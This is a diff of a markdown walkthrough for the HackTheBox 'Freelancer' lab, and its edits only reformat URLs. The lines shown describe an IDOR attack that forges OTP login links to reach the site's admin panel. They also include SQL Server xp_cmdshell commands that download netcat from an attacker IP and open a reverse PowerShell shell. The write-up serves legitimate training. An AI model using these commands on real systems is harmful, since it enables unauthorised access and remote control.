@@ -68,13 +68,15 @@ Add freelancer.htb to /etc/hosts
 ![image7](../resources/452da74b576a4e0ebfdd656652c7d191.png)
 
 - We get the output:
-<http://freelancer.htb/accounts/login/otp/MTAwMTE=/df3bd010f3bbe9bf29bc988924321026/>
+
+`http://freelancer.htb/accounts/login/otp/MTAwMTE=/df3bd010f3bbe9bf29bc988924321026/`
 
 
 ![image8](../resources/4fe23c08c6064d308985cc1bc8ed28a5.png)
 
 - If we go back to the page where we found the admin:
-<http://freelancer.htb/accounts/profile/visit/2/>
+
+`http://freelancer.htb/accounts/profile/visit/2/`
 
 And change 2 for 10011:
 
@@ -92,14 +94,16 @@ So this gives a clue that it could be an IDOR vulnerability
 ![image10](../resources/8119f52e567240beb429a11e506859ef.png)
 
 - Using the QR code link - replace the base64 code:
-<http://freelancer.htb/accounts/login/otp/Mgo=/df3bd010f3bbe9bf29bc988924321026/>
+
+`http://freelancer.htb/accounts/login/otp/Mgo=/df3bd010f3bbe9bf29bc988924321026/`
 
 - Go to the link - we have admin for the site:
 
 ![image11](../resources/c831d287218043569079c9d633e41fba.png)
 
 - Not much here - but if we go to the admin login site:
-<http://freelancer.htb/admin/>
+
+`http://freelancer.htb/admin/`
 
 - We are logged in:
 
@@ -168,7 +172,7 @@ EXEC xp_cmdshell 'powershell -command "(New-Object System.Net.WebClient).Downloa
 **or use: (not both - they do the same thing)**
 
 ```bash
-EXEC xp_cmdshell 'echo IWR <http://10.10.14.24/nc64.exe> -OutFile %TEMP%\nc.exe \| powershell -noprofile';
+EXEC xp_cmdshell 'echo IWR http://10.10.14.24/nc64.exe -OutFile %TEMP%\nc.exe \| powershell -noprofile';
 
 EXEC xp_cmdshell '%TEMP%\nc.exe 10.10.14.24 8888 -e powershell';
 ```
